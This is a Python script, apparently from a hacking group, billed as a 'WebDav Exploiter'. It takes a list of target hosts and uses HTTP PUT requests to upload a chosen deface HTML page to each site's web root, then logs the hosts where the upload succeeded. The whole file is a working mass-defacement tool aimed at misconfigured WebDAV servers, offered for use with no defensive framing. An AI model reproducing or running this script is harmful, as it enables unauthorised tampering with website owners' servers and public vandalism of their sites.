import requests
import sys

print("""
 __      __      ___.   ________      _________   ____
/  \    /  \ ____\_ |__ \______ \    /  _  \   \ /   /
\   \/\/   // __ \| __ \ |    |  \  /  /_\  \   Y   / 
 \        /\  ___/| \_\ \|    `   \/    |    \     /  
  \__/\  /  \___  >___  /_______  /\____|__  /\___/   
       \/       \/    \/        \/         \/ """
)
if len(sys.argv) != 3:
 print("\n\033[34;1m[*]\033[0m python "+sys.argv[0]+" list.txt deface.html")
 exit(0)

print("\n\033[34;1m[*]\033[0m Python WebDav Exploiter\n\033[34;1m[*]\033[0m Coded By ./Xi4u7\n\033[34;1m[*]\033[0m AndroSec1337 Cyber Team\n")

target = open(sys.argv[1], 'r')
while True:
 scheker = open(sys.argv[2]).read()
 sukses = open('webdav_result.txt', 'a')
 host = target.readline().replace('\n','')
 if not host:
  break
 if not host.startswith('http'):
  host = 'http://' + host
 outname = '/'+sys.argv[2]
 print('\033[34;1m[*]\033[0m Sending Files : '+sys.argv[2])
 print('\033[34;1m[*]\033[0m Size File     : '+str(len(scheker)))
 print('\033[34;1m[*]\033[0m Target        : '+host)
 try:
    r = requests.request('put', host + outname, data=scheker, headers={'Content-Type':'application/octet-stream'})
 except:
    print('\033[31;1m[-]\033[0m Failed        : Null Respone\n')
    pass
    continue
 if r.status_code == 200:
  print('\033[32;1m[+]\033[0m Sukses        : '+host+outname+'\n')
  sukses.write(host+outname+'\n')
 else:
  print('\033[31;1m[-]\033[0m Failed        : '+host+outname+'\n')

print("\033[34;1m[*]\033[0m Output Saved On : webdav_output.txt")